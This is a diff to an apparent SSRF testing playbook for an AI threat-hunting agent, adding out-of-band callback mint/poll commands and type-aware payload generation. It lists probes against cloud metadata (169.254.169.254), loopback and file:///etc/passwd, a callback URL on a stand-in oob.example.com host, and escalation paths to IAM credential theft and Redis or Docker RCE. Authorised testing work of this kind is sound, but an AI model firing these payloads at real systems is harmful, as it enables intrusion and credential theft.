@@ -22,7 +22,8 @@ origin: AI Threat Hunting
 ## Tools
 
 - `curl` — manual SSRF probing and payload delivery
-- OOB callback client — use `aith oob status --json` for readiness and `aith oob client logs <name>` for correlated hits
+- `aith oob mint` / `aith oob poll` — mint a nonce-tagged callback URL per probe, then correlate which probe fired (replaces eyeballing the raw listener log). Check shared readiness with `aith oob status --json`; if no named client is running, start one with `aith oob client start <name> --engagement <key> --agent <agent>`.
+- `aith assess classify-payload <value> --mutations` — type the URL/host value in the suspected SSRF parameter and emit ready-made variant sets (the `escalation` bucket for a `url`-typed value is the IMDS/localhost/IPv6-loopback set; `boundary` adds `file://` and `javascript:` scheme probes)
 - Gopherus — gopher protocol payload generation for Redis, MySQL, SMTP exploitation
 
 ---
@@ -46,6 +47,19 @@ Test beyond `url=`. The following parameter names and functional patterns are al
 - API federation — GraphQL federation URLs, microservice routing, internal API gateways
 
 **Discovery technique:** Intercept all outbound requests during normal application use. Any feature that causes the server to make an HTTP request is a candidate. Look for parameters in POST bodies, JSON payloads, and HTTP headers — not just query strings.
+
+**Generate the bypass set deterministically — do not hand-pick payloads.** Once you have the parameter's current value, classify it and pull the type-aware variants instead of typing IMDS/loopback URLs from memory:
+
+```bash
+aith assess classify-payload "https://api.example.com/fetch" --mutations
+```
+
+For a `url`-typed value this returns intent buckets you feed straight into Step 2's mint/fire/poll loop:
+- `escalation` → `http://169.254.169.254/latest/meta-data/`, `http://localhost/admin`, `http://[::1]/` (the metadata + internal-host set)
+- `boundary` → `http://localhost/`, `http://127.0.0.1/`, `file:///etc/passwd`, `javascript:alert(1)` (loopback + scheme-confusion probes)
+- `format` → scheme-downgrade and quoted/embedded variants for parser-differential bypasses
+
+If the parameter instead carries a bare hostname, IP, or path, classify that value — the buckets adapt to the type. Swap the OOB host from `aith oob mint` into each variant before firing so a blind hit is attributable.
 
 #### SaaS Integration Connector Pattern
 
@@ -88,23 +102,38 @@ A 4-way differential is a port-mapping primitive even when response bodies are n
 
 ### Step 2: Confirm with OOB Callback
 
-OOB callback is the fastest confirmation method. If `aith oob status --json`
-shows healthy shared infrastructure, use the named client URL first.
+OOB callback is the fastest confirmation method. Confirm `aith oob status --json` reports healthy shared infrastructure, then run the **mint → fire → poll** loop — do not eyeball the raw listener log.
 
 ```bash
-# Use the unique URL from `aith oob client logs <name> --lines 80`
-?url=http://$OOB_CALLBACK_URL/ssrf-confirm
+# 1. MINT a nonce-tagged callback URL and record the correlation context
+#    (target/param/technique) in one step. Capture the http URL it prints.
+aith oob mint --technique ssrf \
+  --target-url "https://target/api/fetch" --param url \
+  --probe-kind blind-confirm
 
-# If no OOB available, use timing differential:
+# 2. FIRE the payload, substituting the minted host. The unique nonce in the
+#    host is what lets poll attribute the hit back to THIS probe.
+?url=http://<nonce>.oob.example.com/ssrf-confirm
+
+# 3. POLL — parse the client's interaction log and correlate probe<->callback.
+#    Matched rows print the technique + target you minted with, so a hit is
+#    self-documenting; you never grep the listener log by hand.
+aith oob poll --client <name>
+```
+
+`poll` prints `matched <N> unmatched <M>` then one line per correlated hit (`<nonce>  http  from=<ip>  technique=ssrf  target=https://target/api/fetch`). A matched row IS your blind-SSRF confirmation: the server resolved/fetched your nonce host. Unmatched interactions are callbacks with no recorded probe — usually noise or a probe you forgot to mint; ignore them for confirmation. Add `--json` when you want to capture the matched set as evidence.
+
+**If OOB is unavailable, use a timing differential** (mint/poll needs the listener up):
+
+```bash
 # Internal host (fast): ?url=http://127.0.0.1:1/ (connection refused = fast fail)
 # External host (slow): ?url=http://nonexistent.internal.corp:80/ (DNS timeout = slow)
 # Compare response times. >3 second differential = strong signal.
-
 # Time-based with controlled delay:
 ?url=http://127.0.0.1:22/ (SSH banner = slight delay vs immediate rejection)
 ```
 
-**If no OOB available and timing is inconclusive:** fall back to error-based detection. Different internal vs external error messages (connection refused vs timeout vs DNS failure) confirm the server is making requests.
+**If timing is also inconclusive:** fall back to error-based detection. Different internal vs external error messages (connection refused vs timeout vs DNS failure) confirm the server is making requests.
 
 ### Step 3: Determine SSRF Type
 
@@ -115,7 +144,7 @@ The type determines your entire exploitation path. Classify before spending time
 | **Full response** | Server response body returned to you | Highest — read internal services, cloud metadata, files |
 | **Status code only** | 200 vs 500, or "success" vs "error" | Medium — boolean oracle, port scanning, some metadata |
 | **Partial (content-length/headers)** | Response size or headers leak through error messages | Medium — content-length oracle can exfiltrate data bit-by-bit |
-| **Blind** | OOB callback confirms request, no response data | Low for direct data theft, high for internal service interaction via gopher/POST |
+| **Blind** | `aith oob poll` returns a matched callback, no response data | Low for direct data theft, high for internal service interaction via gopher/POST |
 | **Timing only** | Response time differential only | Lowest — port scanning, existence checks only |
 
 ### Step 4: Select Exploitation Path Based on Type
@@ -425,11 +454,11 @@ If the application uses one of these, basic bypass techniques will not work. DNS
 ## Kill Signals — Stop Testing When
 - Application uses SSRF-safe URL library (ssrf-filter, ssrfcheck) confirmed via error messages → bypass unlikely, move on
 - All IP encoding, DNS rebinding, and redirect chain bypasses fail after 15+ attempts → blocklist is robust, move on
-- OOB callback confirms SSRF but response is not returned AND no internal services are reachable → record as blind SSRF (MEDIUM), stop exploitation
+- `aith oob poll` returns a matched callback but response is not returned AND no internal services are reachable → record as blind SSRF (MEDIUM), stop exploitation
 - Cloud metadata returns IAM credentials → CRITICAL, record immediately, stop testing other SSRF vectors
 
 ## Escalate When
-- An OAST/Collaborator callback lands from any payload — even to a whitelisted domain — the server is fetching on your behalf, now enumerate which other schemes, ports, and internal hosts it will reach
+- `aith oob poll` matches a callback to any payload — even one aimed at a whitelisted domain — the server is fetching on your behalf, now enumerate which other schemes, ports, and internal hosts it will reach (mint a fresh nonce per host so each hit stays attributable)
 - Response time for an internal-looking target (127.0.0.1, 169.254.169.254, localhost-only ports, RFC1918 ranges) differs measurably from an external target even when bodies are identical — timing side channels survive when body parity does not
 - An error body, stack trace, redirect Location header, or Content-Length delta leaks an internal hostname, IP, cloud-metadata path, or closed-vs-open port oracle — partial SSRF still chains to IMDS and internal APIs
 - The parameter accepts a non-http(s) scheme (gopher://, dict://, file://, ftp://, ldap://) without a parser error, or DNS resolves before the blocklist check — URL-parser/fetcher split is a classic bypass surface and DNS rebinding is live
@@ -452,7 +481,7 @@ SSRF + CRLF injection -> GCP metadata with Metadata-Flavor header -> service acc
 
 - Vulnerable parameter and endpoint
 - SSRF type (full response, status-code-only, partial, blind, timing-only)
-- OOB callback confirmation from `aith oob client logs <name>` (for blind SSRF)
+- OOB callback confirmation — the matched probe<->callback pair from `aith oob poll --client <name> --json` (for blind SSRF)
 - Filter bypass technique used (encoding, redirect chain, DNS rebinding)
 - Internal services or metadata accessed — confirming an OOB callback fired is not enough; you must show the **attacker outcome** (e.g., full SSRF returned AWS IAM credentials from 169.254.169.254 and those credentials granted `s3:ListBucket` on the production data bucket exposing 50,000 customer records; blind SSRF via gopher reached the unauthenticated Redis instance on port 6379 and set a cron job payload achieving RCE as www-data; SSRF to the internal Docker API at `127.0.0.1:2375` listed running containers and the privileged container creation command confirmed host root access)
 - Full request/response or OOB evidence for reproducibility
